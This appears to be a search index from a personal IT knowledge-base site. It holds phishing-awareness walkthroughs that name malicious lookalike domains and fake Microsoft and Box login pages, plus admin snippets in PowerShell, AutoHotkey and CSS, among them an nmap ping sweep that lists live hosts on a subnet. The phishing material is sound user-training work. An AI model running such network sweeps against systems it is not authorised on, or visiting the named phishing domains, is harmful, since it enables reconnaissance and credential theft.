etc.</p>"},{"location":"kbase/pond/phish007/#takeaways","title":"Takeaways","text":"<p>This attempt would more than likely get blocked after the button is clicked by web filtering (assuming good security), but if not, the attacker could learn your username and password. Hopefully, it would not be your company credentials because everyone knows not to use those anywhere except for approved company systems, but what if you forgot? </p> <ul> <li>What if you logged on with your personal account in a similar scenario? </li> <li>What if you use the same password for your personal account as your other home accounts? </li> <li>What if the attacker takes your credentials and presents some documents stollen from the sender that  pertain to your company? </li> <li>When would you realize it was a scam?</li> </ul> <p>We need to be constantly vigilant and learning how to protect oneself online and why there is no substitue for good training - in a company or at home, you are the last line of defense!</p>"},{"location":"kbase/pond/phish008/","title":"Example Phish 008","text":"<p>Quote</p> <p>\u201cGuests, like fish, begin to smell after three days.\u201d \u2013 Benjamin Franklin</p>"},{"location":"kbase/pond/phish008/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>Look carefully at the web address of the link they want you to click. (first image, highlighted\u2026)</p> <ol> <li> <p>It\u2019s not going to anything related to the consulting company or one of their products.</p> </li> <li> <p>DOT.BID\u2026instead of DOT.COM</p> </li> <li> <p>The \"+\" sign after the forward slash\u2026 not a common way of running websites\u2026</p> </li> <li> <p>Look up, \u201cNorth Plate Bulletin\u201d in google\u2026(see the first image below\u2026) \u2013 <code>northplatebulletin.com</code> exists, its\u2019 a newspaper\u2026 but...</p> </li> <li> <p>northplatebulletin.bid is a BAD url!!! (second image below.)</p> </li> </ol> <p>There is no way around this\u2026you have to be familiar with URLs, domains, and how they work.</p> <p>Yes, it\u2019s possible that this \"David\" got hack, but it\u2019s very easy to make an email look like it came from any address.</p> <p>Yes, companies are targeted. Would someone target your company? It's hard to say, and one would like to think probably not, but what if you were a secondary target? In this example, someone might have targeted the company where \"David\" works. Poor \"David\" fell for the scam and the attacker gained access to his client list. You got the bad email and so on a so forth.</p> <p></p> <p>Your web browser can protect against known \"bad\" links. Unfortunately, this relys on those links being reported. With so many links being generated for malicious puposes all the time, it's almost impossible to detect bad links.</p> <p></p>"},{"location":"kbase/pond/phish009/","title":"Example Phish 009","text":"<p>Quote</p> <p>\u201cMy Biggest worry is that when I\u2019m dead and gone, my wife will sell my fishing gear for what I said I paid for it.\u201d \u2013 Koos Brandt</p>"},{"location":"kbase/pond/phish009/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<ul> <li> <p>The first clue that pops up in your mind... \u201cWhat agreement?\u201d. Did you initiate this? Why do you need to look at an agreement all of a sudden?</p> </li> <li> <p>The second clue is revealed by HOVERING over the link!!!</p> </li> <li> <p>You should not get as far as clicking the link if you are not sure, but the third clue is that the URL in the web browser has nothing to do with anything!!!</p> </li> <li> <p>Another clue to look out for is \"Was this sent to many people at the same time? If you check with your team and they too got the same email, is it possible that a file needed to be sent to many people at the same time? It can happen, but was it necessary?</p> </li> <li> <p>NEVER, EVER use your company password on any website. Only use it for approved services!</p> </li> <li> <p>Do not reply to the email asking if it's legitimate. The scammer could respond! Always verify by calling \"offline\".</p> </li> </ul>"},{"location":"kbase/pond/phish010/","title":"Example Phish 010","text":"<p>Quote</p> <p>\u201cThe charm of fishing is that it is the pursuit of what is elusive but attainable, a perpetual series of occasions of hope.\u201d \u2013 John Buchan</p>"},{"location":"kbase/pond/phish010/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>This is a phishing scenario, but it's important to understand that it first sends you to a legitimate site and then presents you with the \"bad\" links later on.</p> <p>It's a trick to gain confidence and hope that a recipient will check the first link, but not the second. It can bypass link checkers and it's more familiar as many people these days use online file sharing systems like OneDrive, DropBox, Box.com, etc.</p>"},{"location":"kbase/pond/phish010/#link-1","title":"Link 1","text":"<p>In the email itself - goes to a Microsoft owned site and used legitimately for OneDrive - their online storage tool.</p> <p></p>"},{"location":"kbase/pond/phish010/#link-2","title":"Link 2","text":"<p>Once on the OneDrive webpage - you are presented with the web version of a OneNote note that has two files in it with two links, both to the same place.</p>"},{"location":"kbase/pond/phish010/#takeaways","title":"Takeaways","text":"<ul> <li>Take notice of the 3 slashes and the first dot working backwards from the 3d slash. </li> <li>Thats the target of the link.</li> <li>unless ademarojaya.com is something you recognize, this is not a legitimate link, site, or email.</li> <li>Best course of action: delete email, call sender. Never reply to emails for verification and always double check the phone number before calling it.</li> </ul>"},{"location":"kbase/pond/phish011/","title":"Example Phish 011","text":"<p>Quote</p> <p>\u201cIf your concentration is getting bad, take up bass fishing. It will really improve your ability  to focus. If you aren\u2019t ready when that fish hits, you can\u2019t set the hook.\u201d \u2013 Lee Trevino</p>"},{"location":"kbase/pond/phish011/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>In this scenario you receive an email from an \"Amy\" that you know very well.</p> <p></p> <p>Box.com?? Think again! Look at the browser Address Bar! </p> <p>Look at how good this FAKE page looks!</p> <p></p> <p>Office365?? Nope!! Read on for what you should be looking for here....</p> <p></p> <p>Pretty amazing!</p> <p>The most important bit here is this: if you are about to enter credentials, look at the web address. If it has nothing to do with where you are trying to login, chances are it's a scam!</p> <p>Compare the two addresses below - notice what Firefox is highlighting for you:</p> <p></p> <p>wsicweb.cf is very unusual. <code>.cf</code> is not common at all! </p>"},{"location":"kbase/pond/phish012/","title":"Example Phish 012","text":"<p>Quote</p> <p>\u201cIf fishing is interfering with your business, give up your business.\u201d \u2013 Sparse Grey Hackle </p>"},{"location":"kbase/pond/phish012/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<ol> <li>The email is from \"mmsend.com\" - that has nothing to do with your company and/or unfamiliar.</li> <li>The link also goes to mmsend19.com. Nothing to do with your company either and unfamiliar.</li> <li>Is your phone at the office on a profile that is set to send voicemail to your email?</li> <li>In the past, the voicemail that comes from our systems does not require you to click a link, but rather it gives you the wav file attached.</li> <li>Lastly, Re: in the subject line doesn't make much sense.</li> </ol> <p>In short, 4 or 5 reasons why it's not a legitimate email.</p>"},{"location":"kbase/pond/phish013/","title":"Example Phish 013","text":"<p>Quote</p> <p>\u201cCalling fishing a hobby is like calling brain surgery a job.\" -- Paul Schullery</p>"},{"location":"kbase/pond/phish013/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<ul> <li>Is this what your voicemail emails look like??</li> <li> <p>How about the link...what?!</p> <p></p> </li> </ul>"},{"location":"kbase/pond/phish014/","title":"Example Phish 014","text":"<p>Quote</p> <p>\u201cLike hunting, fishing offers up a sacrifice and a bond to the land that increases power in those with honorable tactics.\" -- Jessica Marie Baumgartner</p>"},{"location":"kbase/pond/phish014/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>In short:</p> <ul> <li>Check your links before you click it</li> <li>Check your browser address bar before you enter credentials</li> <li>Websites can be faked easily</li> <li>This type of phishing scam can be used with many different known entities like Amazon, popular online email clients, other Banks, etc.</li> <li>This is a good reason not to use your company email for websites not related to company business.</li> </ul> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"kbase/pond/phish015/","title":"Example Phish 015","text":""},{"location":"kbase/pond/phish015/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>In short, before entering credentials, look at the web address and make sure the site you are on \"matches\" with the URL. Also, please take a look at phish011 as it is an almost identical scam.</p> <p>Here is the original email that you might receive:</p> <p></p> <p>The link has two sets of three slashes, right? The first is the <code>cudasvc</code> (your company email filter) that attemps to verify links for us against a known bad links database. This is not reliable, but another layer that could help. The second set of three slashes is the actual link in the highlighted area.</p> <p></p> <p>If you follow the link you get to a seemingly legitimate webpage. <code>Wixsite.com</code> is an online website builder where users with little web development skills can generate a website. While not a bad website on it's own, this is suspicious as most file hosting services would not be on <code>Wixsite.com</code></p> <p>Furthermore, the PDF and Lock icons are a bit unprofessional looking and stand out a bit too much. Most proper, secure sites would not have those icons in that prominent of a spot of a page. They are really trying to make you feel \"safe\". </p> <p>The preview icon is also something that is commonly used in scam website.</p> <p>Lastly, the \"links\" to Microsoft at the bottom of the page are not multiple links. They are an image of all those links. The hacker was too lazy to reproduce the navigation menu, so they simply took a screenshot of the menu and placed it at the bottom of the page to make it look more authentic.</p> <p></p> <p>Finally, you are signing into Microsoft as the sign-in screen displays, but the URL/Web address reveal you are on a site with domain <code>backblazeb2.com</code>. This is suspicious and incorrect. The actual Microsoft login screen is on <code>microsoftonline.com</code>!</p> <p>If you enter credentials on this page and the subsequent page, your username and password will be sent to the attackers and you will get a invalid login screen.</p> <p></p>"},{"location":"kbase/pond/phish016/","title":"Example Phish 016","text":""},{"location":"kbase/pond/phish016/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<ul> <li>From Address: strange domain - cerimoniale.net</li> <li> <p>Download Invoice Link: strange domain, not matching from - sendibt2.com</p> </li> <li> <p>Check links by hovering the cursor/mouse over them.</p> </li> <li>There are three links all to different places: infosecventures.com</li> </ul> <p></p>"},{"location":"kbase/snippets/","title":"Snippets","text":""},{"location":"kbase/snippets/#commands","title":"Commands","text":"<ul> <li>NMAP</li> </ul>"},{"location":"kbase/snippets/#powershell","title":"PowerShell","text":"<ul> <li>Large File Sizes</li> <li>Copy Files Remote</li> <li>Thread Monitor</li> </ul>"},{"location":"kbase/snippets/cmds/cmd/","title":"Command Prompt","text":"<p>Published: 2025-02-16</p> <ul> <li>Reduce Size on Disk     <pre><code>    dism /Online /Get-ReservedStorageState\n\n    dism /Online /Set-ReservedStorageState /State:Disabled\n    dism /Online /Cleanup-Image /StartComponentCleanup\n</code></pre></li> </ul>","tags":["Commands"]},{"location":"kbase/snippets/cmds/nmap/","title":"NMAP","text":"<p>Published: 2025-02-07</p> <ul> <li>Good command to list the IPs of online computers in a given subnet.     <pre><code>nmap -sn -PR -n -oG - 192.168.31.0/24 | grep \"Up\" | awk '{print $2}'\n</code></pre></li> </ul>","tags":["Commands"]},{"location":"kbase/snippets/css/firefoxgui/","title":"Firefox Lepton Pref","text":"<p>Published: 2025-04-21</p> <pre><code>#PlacesToolbarItems {\n    margin-bottom: 3px !important;\n}\n\n#PlacesToolbarItems .bookmark-item {\n    padding-top: 5px !important;\n    padding-bottom: 5px !important;\n}\n/* tab label */\n#TabsToolbar .tabbrowser-tab:is([selected],[multiselected]) label {\n    /* color: #174F8D !important; */\n    /* font-weight: bold !important; */\n    text-decoration-line: underline !important;\n    /* text-decoration-color: #174F8D !important; */\n}\n</code></pre>","tags":["CSS"]},{"location":"kbase/snippets/powershell/copyfilesremote/","title":"Get Credentials","text":"<p>Published: 2024-05-26</p> <pre><code>$creds = Get-Credential -UserName \"{domain_name}\\$Env:UserName\" `\n    -Message \"Enter your privileged account details:\"\n\nNew-PSDrive -Name \"AdminShare\" `\n    -PSProvider \"FileSystem\" `\n    -Root \"\\\\{servername}\\c$\" `\n    -Credential $creds\n\ntry {\n    Copy-Item -Path \"$PSScriptRoot\\{filename01}.ext\" `\n        -Destination \"AdminShare:\\{folder}\\{path}\" `\n        -Force\n    Copy-Item -Path \"$PSScriptRoot\\{filename02}.ext\" `\n        -Destination \"AdminShare:\\{folder}\\{path}\" `\n        -Force\n    Copy-Item -Path \"$PSScriptRoot\\{filename03}.ext\" `\n        -Destination \"AdminShare:\\{folder}\\{path}\" `\n        -Force\n    Write-Host \"Files copied.\"\n}\ncatch {\n    Write-host -f yellow \"Encountered Error:\"$_.Exception.Message\n}\n\nRemove-PSDrive -Name \"AdminShare\"\n</code></pre>","tags":["PowerShell"]},{"location":"kbase/snippets/powershell/largefilesize/","title":"Large File Sizes","text":"<p>Published: 2024-03-31</p> <pre><code>#change the number after the \"-gt\" to filter the size files you want\n#100000000 = 100MB\n#1000000000 = 1GB\n#change the \"c:\\users\\yourname\" after \"-path\" to select which path to run on\n#can run on \"c:\" if needed\n\nGet-ChildItem -path c:\\users\\yourname -ErrorAction silentlycontinue -Recurse | \nWhere-Object {($_.Length) -gt '1000000000'} |\nSort-Object -Property length -Descending | \nFormat-Table -autosize -wrap -property `\n    @{Label=\u201dLast access\u201d;Expression={($_.lastwritetime).ToshortDateString()}}, \n    @{label=\u201dsize in megabytes\u201d;Expression={\u201c{0:N2}\u201d -f ($_.Length / 1MB)}},\n    fullname\n</code></pre>","tags":["PowerShell"]},{"location":"kbase/snippets/powershell/psmmf/","title":"Memory Mapped Files","text":"<p>Published: 2025-02-16</p>","tags":["PowerShell"]},{"location":"kbase/snippets/powershell/psmmf/#main-script","title":"Main Script","text":"<pre><code>try {\n    # Generate unique GUIDs for MMF and EventWaitHandle\n    $mmfID = [System.Guid]::NewGuid().ToString()\n    $evntID = [System.Guid]::NewGuid().ToString()\n\n    Write-Host \"Generated MMF ID: $mmfID\"\n    Write-Host \"Generated EventWaitHandle ID: $evntID\"\n\n    # Create an EventWaitHandle for synchronization BEFORE starting the second script\n    $evnt = [System.Threading.EventWaitHandle]::new($false, `\n        [System.Threading.EventResetMode]::AutoReset, \"Global\\$evntID\")\n\n    # Create the Memory-Mapped File (MMF) before calling the second script\n    $mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateOrOpen(\"Global\\$mmfID\", 1024)\n\n    # Start the second script and pass both IDs as arguments\n    $secondScriptPath = \".\\second.ps1\"  # Adjust path if necessary\n    Start-Process -FilePath \"powershell.exe\" -ArgumentList `\n                \"-File `\"$secondScriptPath`\" `\"$mmfID`\" `\"$evntID`\"\" -NoNewWindow\n\n    Write-Host \"Waiting for data from second script... (Timeout: 60s)\"\n\n    # Wait for event signal (timeout after 60 seconds)\n    if (-not $evnt.WaitOne(60000)) {\n        throw \"Timeout: No data received within 60 seconds.\"\n    }\n\n    Write-Host \"Data received. Reading from Memory-Mapped File...\"\n\n    # Create a view stream for reading data\n    $stream = $mmf.CreateViewStream()\n    $reader = [System.IO.StreamReader]::new($stream)\n\n    # Read the JSON data from the MMF\n    $jsonRead = $reader.ReadLine()\n\n    if (-not $jsonRead) {\n        throw \"Error: No data found in memory-mapped file.\"\n    }\n\n    # Try to parse the JSON data\n    try {\n        $pgpDeTaskInfo = $jsonRead | ConvertFrom-Json\n    } catch {\n        throw \"Error parsing JSON data: $_\"\n    }\n\n    Write-Host \"Successfully received and parsed JSON data:\"\n    Write-Host $pgpDeTaskInfo\n\n} catch {\n    Write-Host \"An error occurred: $_\" -ForegroundColor Red\n} finally {\n    # Ensure cleanup of resources\n    if ($reader) { $reader.Close() }\n    if ($stream) { $stream.Close() }\n    if ($mmf) { $mmf.Dispose() }\n    Write-Host \"Resources cleaned up.\"\n}\n</code></pre>","tags":["PowerShell"]},{"location":"kbase/snippets/powershell/psmmf/#second-script","title":"Second Script","text":"<pre><code>param (\n    [string]$passedMmfID,   # Receive the MMF ID from the main script\n    [string]$passedEventID  # Receive the EventWaitHandle ID from the main script\n)\n\ntry {\n    Write-Host \"Second script started. Using MMF ID: $passedMmfID\"\n    Write-Host \"Using EventWaitHandle ID: $passedEventID\"\n\n    # Simulating processing time\n    Start-Sleep -Seconds 2\n\n    # Define some example data\n    $errorCode = 0\n    $errorDescription = \"Error description.\"\n\n    # Define a custom object for the data we want to send back\n    $taskInfo = [PSCustomObject]@{\n        ErrorCode        = $errorCode\n        ErrorDescription = \"${errorDescription}\"\n    }\n\n    $jsonData = $taskInfo | ConvertTo-Json -Compress\n\n    # Open the memory-mapped file using the passed MMF ID\n    $mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting(\"Global\\$passedMmfID\")\n    $stream = $mmf.CreateViewStream()\n    $writer = New-Object System.IO.StreamWriter($stream)\n    $writer.AutoFlush = $true  # Ensures data is written immediately\n\n    Write-Host \"Writing JSON data to MMF...\"\n    # Write the JSON string to the memory-mapped file\n    $writer.WriteLine($jsonData)\n\n    # Open the named EventWaitHandle to signal completion\n    $evnt = [System.Threading.EventWaitHandle]::new($false, `\n        [System.Threading.EventResetMode]::AutoReset, \"Global\\$passedEventID\")\n\n    # Signal the event to notify the main script that data is available\n    $evnt.Set() | Out-Null\n\n    Write-Host \"Data sent successfully.\"\n\n} catch {\n    Write-Host \"An error occurred in the second script: $_\" -ForegroundColor Red\n} finally {\n    # Ensure cleanup of resources\n    if ($writer) { $writer.Close() }\n    if ($stream) { $stream.Close() }\n    if ($mmf) { $mmf.Dispose() }\n    Write-Host \"Second script resources cleaned up.\"\n}\n</code></pre>","tags":["PowerShell"]},{"location":"kbase/snippets/powershell/psmutex/","title":"Mutex","text":"<p>Published: 1900-01-01</p>","tags":["PowerShell"]},{"location":"kbase/snippets/powershell/psmutex/#placeholder","title":"Placeholder","text":"","tags":["PowerShell"]},{"location":"kbase/snippets/powershell/psrunspaces/","title":"Run Spaces","text":"<p>Published: 1900-01-01</p>","tags":["PowerShell"]},{"location":"kbase/snippets/powershell/psrunspaces/#placeholder","title":"Placeholder","text":"","tags":["PowerShell"]},{"location":"kbase/snippets/powershell/threadmonitor/","title":"Thread Monitor","text":"<pre><code>#*=============================================================================\n#* Script Name:  Get-ThreadCPUpct.ps1\n#*=============================================================================\n#* Created:     01/01/2025\n#* Author:      First Last\n#*=============================================================================\n\n###############################################################################\n#\n# DO NOT EDIT THE CODE DIRECTLY - Check it out of source control and use deploy.ps1\n#\n###############################################################################\n\n&lt;#\n    .SYNOPSIS\n    This script provides an automated way to monitor the stuck thread of a \n    Tomcat instance. If a thread is found to be stuck longer than 6 hours\n    an email is sent, but only 1 email. Once the instance is restarted and\n    the thread goes away, the script will adjust.    \n#&gt;\n\n# Setup the log file name\n$todayDate = Get-Date -Format \"yyyyMMdd\"\n$Transcript = $PSScriptRoot + \"\\Log_${todayDate}.txt\"\n$fromEmail = 'monserver &lt;DoNotReply.Monserver@domain.com&gt;'\n$toEmail = @(\n    \"alert.email.1@domain.com\", \n    \"alert.email.2@domain.com\", \n    \"alert.email.3@domain.com\", \n    \"alert.email.4@domain.com\"\n    )\n\n# Start recording output to file\nStart-Transcript -Path $Transcript -Append\n\n# Define an array of remote server to query\n$remoteServerNames = @(\n    \"SERVER-01\", \n    \"SERVER-02\", \n    \"SERVER-03\",\n    \"SERVER-31\", \n    \"SERVER-32\", \n    \"SERVER-33\",\n    \"SERVER-91\", \n    \"SERVER-92\", \n    \"SERVER-93\"\n    )\n\n$ThreadAge = @{\n    L=\"ThreadAge\";\n    E={[Timespan]::FromMilliseconds(\n            $_.UserModeTime + $_.KernelModeTime\n        ).ToString(\"dd\\:hh\\:mm\\:ss\")}\n    }\n\n$ThreadAgeD = @{\n    L=\"ThreadAgeD\";\n    E={[Timespan]::FromMilliseconds(\n            $_.UserModeTime + $_.KernelModeTime\n        ).ToString(\"dd\")}\n    }\n\n$ThreadAgeH = @{\n    L=\"ThreadAgeH\";\n    E={[Timespan]::FromMilliseconds(\n            $_.UserModeTime + $_.KernelModeTime\n        ).ToString(\"hh\")}\n    }\n\n$ThreadWaitReason = @{\n    L = 'ThreadWaitReason'\n    E = {\n        # property is an array, so process all values\n        $value = $_.ThreadWaitReason\n\n        switch([int]$value)\n        {\n            0          {'Executive'}\n            1          {'FreePage'}\n            2          {'PageIn'}\n            3          {'PoolAllocation'}\n            4          {'ExecutionDelay'}\n            5          {'FreePage'}\n            6          {'PageIn'}\n            7          {'Executive'}\n            8          {'FreePage'}\n            9          {'PageIn'}\n            10         {'PoolAllocation'}\n            11         {'ExecutionDelay'}\n            12         {'FreePage'}\n            13         {'PageIn'}\n            14         {'EventPairHigh'}\n            15         {'EventPairLow'}\n            16         {'LPCReceive'}\n            17         {'LPCReply'}\n            18         {'VirtualMemory'}\n            19         {'PageOut'}\n            20         {'Rendezvous'}\n            21         {'KeyedEvent'}\n            22         {'Terminated'}\n            23         {'ProcessInSwap'}\n            24         {'CpuRateControl'}\n            25         {'CalloutStack'}\n            26         {'Kernel'}\n            27         {'Resource'}\n            28         {'PushLock'}\n            29         {'Mutex'}\n            30         {'QuantumEnd'}\n            31         {'DispatchInt'}\n            32         {'Preempted'}\n            33         {'YieldExecution'}\n            34         {'FastMutex'}\n            35         {'GuardedMutex'}\n            36         {'Rundown'}\n            37         {'MaximumWaitReason'}\n            default    {\"$value\"}\n        }\n    }  \n}\n\n$currSidFilePaths = @()\n$serverWaitSecs = 5\n\n# Connect to the remote server using WMI and retrieve thread information for Tomcat\n$qryServer = @(\n    \"SELECT * \"\n    \"FROM Win32_PerfFormattedData_PerfProc_Thread \"\n    \"WHERE PercentProcessorTime &gt; 95 AND Name LIKE '%Tomcat%'\"\n) -Join \"\"\n\nforeach ($remoteServer in $remoteServerNames) {\n    # Initialize retry count\n    $retryCount = 1\n    $errRetryCount = 1\n    $maxRetries = 3\n    $tCount = 0\n\n    Write-Host \"`nChecking threads on server: $remoteServer\"\n    Write-Host \"==============================================================================\"\n\n    while (($errRetryCount -le $maxRetries) -and ($retryCount -le $maxRetries) -and ($tCount -lt 1)) {\n        try {\n            Write-Host \"Try for threads: ${retryCount}\"\n\n            $threads = Get-WmiObject -Query $qryServer -ComputerName $remoteServer -ErrorAction Stop\n            $errRetryCount = 1 # maxRetries errors per try\n\n            $tCount = $threads | Measure-Object | Select-Object -ExpandProperty Count\n            Write-Host \"Thread count: ${tCount}\"\n\n            if ($tCount -lt 1) {             \n                if ($retryCount -lt $maxRetries) {\n                    Write-Host \"Waiting ${serverWaitSecs}s and then retrying to double-check...\"\n                    Start-Sleep -Seconds $serverWaitSecs\n                    Write-Host \"Retrying WMI query...\"\n                } else {\n                    Write-Host \"Moving on...\"\n                }\n                $retryCount++\n            } else {\n                 Write-Host \"Found threads: $tCount\"\n            }\n\n        } catch {\n            $errRetryCount++\n            Write-Host \"Error try #${errRetryCount} failed: $_\"\n            Start-Sleep -Seconds $serverWaitSecs\n        }\n    } \n\n    if ($tCount -gt 0){\n        # Iterate through each thread and get the owner process command line so we know which instance.\n        foreach ($thread in $threads) {\n            $processId = $thread.IDProcess\n            $threadId = $thread.IDThread\n            $pctCPU = $thread.PercentProcessorTime\n\n            $qryProc = @(\n                \"SELECT CommandLine \"\n                \"FROM Win32_Process \"\n                \"WHERE ProcessId = $processId\"\n            ) -Join \"\"\n\n            $qryThread = @(\n                \"SELECT * \"\n                \"FROM Win32_Thread \"\n                \"WHERE Handle = $threadId\"\n            ) -Join \"\"\n\n            # Initialize retry count\n            $retryCount = 1\n            $maxRetries = 3\n\n            :triesTime while ($retryCount -le $maxRetries) {\n                try {\n                    Write-Host \"Try for cpu time: ${retryCount}\"\n                    $cpuTime = Get-WmiObject `\n                        -Query $qryThread `\n                        -ComputerName $remoteServer `\n                        -ErrorAction Stop | `\n                        Select-Object $ThreadAge, $ThreadAgeD, $ThreadAgeH, $ThreadWaitReason \n                    break triesTime\n                } catch {\n                    $retryCount++\n                    Write-Error \"Attempt $retryCount failed: $_\"\n                    Start-Sleep -Seconds $serverWaitSecs\n                }\n            }\n\n            # Initialize retry count\n            $retryCount = 1\n            $maxRetries = 3\n\n            :triesCmdL while ($retryCount -le $maxRetries) {\n                try {\n                    Write-Host \"Try for command line: ${retryCount}\"\n                    $commandLine = (Get-WmiObject -Query $qryProc `\n                                        -ComputerName $remoteServer `\n                                        -ErrorAction Stop).CommandLine\n                    break triesCmdL\n                } catch {\n                    $retryCount++\n                    Write-Error \"Attempt $retryCount failed: $_\"\n                    Start-Sleep -Seconds $serverWaitSecs\n                }\n            }\n\n            $commandLine = $commandLine.Substring($commandLine.LastIndexOf(\"/\") +1)\n\n            $iFound = @(\n                \"Instance: ${commandLine} \"\n                \"p-ID: ${processId} \"\n                \"t-ID: ${threadId} \"\n                \"t-CPU %: ${pctCPU} \"\n                \"t-CPU time: $($cpuTime.ThreadAge) \"\n                \"t-Reason: $($cpuTime.ThreadWaitReason) \"\n            ) -Join \"\"\n\n            Write-Host $iFound\n\n            # if the instance cputime is greater than 6 hours check if it's foundid file is present\n            # we have a persistent, stuck thread)\n            if (([int]$cpuTime.ThreadAgeD -gt 0) -or ([int]$cpuTime.ThreadAgeH -ge 6)) \n            {\n                $sidserver = $remoteServer.Substring($remoteServer.LastIndexOf(\"-\") +1) #03\n                $sidinst = $commandLine.Substring($commandLine.Length - 2) #07\n                $sid = $sidserver + $sidinst + $processId + $threadId #sid03078285964 \n                $sidFilePath = $PSScriptRoot + \"\\sid${sid}\"\n\n                $iMessage = @(\n                    \"If an opportunity arises you can restart the intance in off hours.\"\n                    \"Make sure to Log this occurance.\"\n                    \"Take a look at today's log to determine the start time.\"\n                    \"Log is located here:\"\n                    \"  MONSERVER-02 - ${Transcript}\"\n                ) -Join \"`n\"\n\n                if (-Not (Test-Path -Path $sidFilePath)) {\n                    # Send the message using the internal relay\n                    Send-MailMessage `\n                        -From $fromEmail `\n                        -To $toEmail `\n                        -Subject \"_Alert - APP - Thread Monitor\" `\n                        -Body \"${remoteServer} - ${iFound}`n`n${iMessage}\" `\n                        -Priority High `\n                        -SmtpServer 'relay.domain.com'\n\n                    New-Item -Path $sidFilePath -ItemType File | Out-Null\n                }\n\n                $currSidFilePaths += $sidFilePath\n            }\n        }\n    }\n}\n\n# At the end of the script, get all sid files in the script directory.\n$allSidFiles = Get-ChildItem -Path $PSScriptRoot -File -Filter \"sid*.*\"\n\n# Clear out sid files that are no longer needed.\nforeach ($sidFile in $allSidFiles) {\n\n    if (-Not ($currSidFilePaths -contains $sidFile.FullName)) {\n        # File is not in the array, delete it\n        Remove-Item -Path $sidFile.FullName -Force\n        Write-Output \"Deleted file: $($sidFile.FullName)\"\n    }\n}\n\nStop-Transcript\n\n# Get the files in the directory\n$files = Get-ChildItem -Path $PSScriptRoot -File -Filter \"*.txt\"\n\n# Count the number of files in the directory\n$fileCount = $files.Count\n\n# Check if the number of files is greater than 90\nif ($fileCount -gt 90) {\n    # Get the oldest file in the directory\n    $oldestFile = $files | Sort-Object LastWriteTime | Select-Object -First 1\n\n    # Delete the oldest file\n    Remove-Item $oldestFile.FullName\n}\n</code></pre>"},{"location":"posts/AHKGithubPrivate/","title":"Private GitHub Repo and Autohokey","text":"<p>Published: 2019-05-06</p> <p>How to connect to a GitHub Private Repository to download files.</p> <p>This can be useful if you want to automatically update your application to the latest release.</p> <pre><code>#SingleInstance, force\n#NoEnv\n\n#Include %A_ScriptDir%\\..\\json\\JSON.ahk ;https://github.com/cocobelgica/AutoHotkey-JSON\n\n;------------------------------------------------------------------\n;GLOBALS\n\nglobal g_url := \"https://api.github.com/repos/&lt;username&gt;/&lt;repository&gt;/releases\"\nglobal g_file := \"filename.zip\"\nglobal g_saveto := A_Desktop . \"/\" . g_file\n\n; You need to generate this in your github account\nglobal g_token := \"74jf8gh7ihdg9orlkk948rjfugnry369jgirn857\" ; &lt;-- not a real token, demo purposes\n\n;------------------------------------------------------------------\n;MAIN CODE\n\nr := false\n\nrequest := comobjcreate(\"WinHttp.WinHttpRequest.5.1\") ; Lets get our \"navigator\"\n\nrequest.Open(\"GET\", g_url , false)\nrequest.SetRequestHeader(\"Authorization\", \"token \" . g_token)\nrequest.Send() ; Get the releases information\n\nif (request.responsetext = \"failed\" || request.status != 200 || comobjtype(request.responsestream) != 0xd) {\n      FileAppend, % \"Error:`r`n\"\n          . \"Status: `r`n\" . request.status . \"`r`n\"\n          . \"Headers: `r`n\" . request.getallresponseheaders() . \"`r`n\"\n          . \"Response: `r`n\" . request.responsetext\n          . \"`r`n\", *\n}\nelse\n{\n  jsObj := JSON.Load(request.ResponseText) ; Parse the JSON file returned from the GitHub API\n\n  for index, element in jsObj.1.assets\n  {\n    ; we need to get a certain file out of all the assets\n    if (element.name = g_file) {\n      g_url := element.url\n    }\n  }\n}\n\n  request.option(6) := 0 ;no redirects\n  request.open(\"GET\", g_url, false)\n  request.setrequestheader(\"Authorization\", \"token \" . g_token)\n  request.setrequestheader(\"Accept\", \"application/octet-stream\")\n  request.send() ;FIRST request gets the 302 redirect to AWS\n\n  if (request.responsetext = \"failed\" || request.status != 302 || comobjtype(request.responsestream) != 0xd) {\n      FileAppend, % \"Error:`r`n\"\n          . \"Status: `r`n\" . request.status . \"`r`n\"\n          . \"Headers: `r`n\" . request.getallresponseheaders() . \"`r`n\"\n          . \"Response: `r`n\" . request.responsetext\n          . \"`r`n\", *\n  }\n  else\n  {\n    g_url := request.getresponseheader(\"Location\") ;get the redirect URL\n\n    request.open(\"GET\", g_url, false)\n    request.send() ;SECOND request gets the file to download\n\n    if (request.responsetext = \"failed\" || request.status != 200 || comobjtype(request.responsestream) != 0xd) {\n        FileAppend, % \"Error:`r`n\"\n            . \"Status: `r`n\" . request.status . \"`r`n\"\n            . \"Headers: `r`n\" . request.getallresponseheaders() . \"`r`n\"\n            . \"Response: `r`n\" . request.responsetext\n            . \"`r`n\", *\n    }\n    else\n    {\n        g_url := request.getresponseheader(\"Content-Length\")\n\n        URLDownloadToFile, % g_url, % g_saveto ; download the file\n\n        if (ErrorLevel = 1) {\n            FileAppend, % splash_msg_prog . \"Download Failed...\"\n        } else {\n            FileAppend, % splash_msg_prog . \"File downloaded!\"\n        }\n\n        FileAppend, % \"Done!`r`n\", *\n    }\n  }\n}\nreturn\n</code></pre>","tags":["AutoHotKey","API","Github"]},{"location":"posts/BatchRun/","title":"Batch Run","text":"<p>Published: 2007-10-16</p> <p> Git Repository</p> <p></p> <p>This application was written to run multiple sql scripts files against an MS Sql Server database and to learn more about .NET Windows application development.</p> <p>It is pretty much a work in progress, but it's at a usable point.</p>","tags":["C#",".NET","Programming"]},{"location":"posts/BetterSendTo/","title":"A Better \"Send to Mail Recipient\" With Outlook","text":"<p>Published: 2009-01-03</p> <p>Sometimes when sending files through email, you want to be able to simply right-click on the file and select Send to mail recipient form the context menu. If you are an Outlook 2003 or 2007 user, you might have noticed that when you do this, Outlook generates a plain text email with your files attached. </p> <p>While a plain text email is ok, and probably the way all email should be, most of us have been spoiled with html email that allows fancy formatting and we want to keep this functionality when we right-click to send attachments. With this nice formatting ability we also have the added bonus that our signatures get automatically appended to the end of the 